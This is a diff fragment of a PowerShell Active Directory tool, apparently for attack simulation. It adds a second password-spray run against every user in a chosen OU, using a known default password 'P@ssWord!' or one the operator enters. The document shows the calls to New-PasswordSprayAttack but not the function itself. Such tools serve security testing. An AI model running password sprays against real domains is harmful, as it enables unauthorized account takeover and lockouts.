@@ -1947,17 +1947,34 @@ $answer   = Get-Answer -question $question -defaultValue $No
 If ($answer -eq $yes)
 {
 
-Write-Host "`n`nCurrent Default Domain Password Policy Settings:" -ForegroundColor $global:FGCHighLight
+Write-Host "`nCurrent Default Domain Password Policy Settings:" -ForegroundColor $global:FGCHighLight
 Get-ADDefaultDomainPasswordPolicy
 pause
 
 $MyDomain = $env:USERDNSDOMAIN
 $MyPath   = Get-KeyValue -key "MySearchBase"
+$NoU = (Get-ADUser -filter * -SearchBase $MyPath).count
 
 #first run with random password
-$MyPW     = Get-RandomPassword
-New-PasswordSprayAttack -Domain $MyDomain -Password $MyPW -SearchBase $MyPath
+$MyPW01     = Get-RandomPassword
 
+$MyPW02 = "P@ssWord!"
+$question = "`nType in a known password. Do you like to use this password '$MyPW02' for the next run - Y or N? Default "
+$prompt   = Get-Answer -question $question -defaultValue $yes
+if ($prompt -ne $yes) 
+   {
+   $MyPW02 = Read-Host "Enter another password:"
+   }
+       
+Write-Host ""
+Write-Host "First run with password $MyPW01 against $NoU users from OU $MyPath" #-ForegroundColor $global:FGCHighLight
+Write-Host "Second run with password $MyPW02 against $NoU users from OU $MyPath" # -ForegroundColor $global:FGCHighLight
+Write-Host ""
+pause
+New-PasswordSprayAttack -Domain $MyDomain -Password $MyPW01 -SearchBase $MyPath
+New-PasswordSprayAttack -Domain $MyDomain -Password $MyPW02 -SearchBase $MyPath
+
+pause
 }
 elseIf ($answer -eq $exit)
 {
